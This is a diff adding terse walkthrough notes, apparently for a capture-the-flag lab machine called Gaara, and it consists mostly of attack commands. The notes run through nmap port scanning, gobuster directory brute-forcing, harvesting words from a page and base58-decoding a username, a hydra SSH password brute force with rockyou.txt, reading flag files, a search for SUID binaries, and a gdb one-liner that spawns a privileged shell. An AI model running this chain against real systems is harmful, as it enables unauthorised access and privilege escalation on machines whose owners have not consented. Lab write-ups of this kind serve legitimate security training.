@@ -1,0 +1,30 @@
+nmap -p- 192.168.0.104
+do http enumeration 
+
+
+gobuster dir -u http://192.168.0.104 -x txt,php,html --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Check this /Cryoserver
+
+curl http://192.168.0.104/iamGaara | grep -oE '\w+' | sort -u -f | more
+
+Find f1MgN9mTf9SNbzRygcU
+decude base58
+
+U get user name gaara:ismyname
+
+
+
+
+gaara:ismyname
+SSH password cracking attack 
+
+hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.0.104 ssh
+cat flag.txt
+cat Kazekage.txt
+Encode base 64
+cd /usr/local/games
+
+cat .supersecret.txt 
+find / -perm -u=s -type f 2>/dev/null
+
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
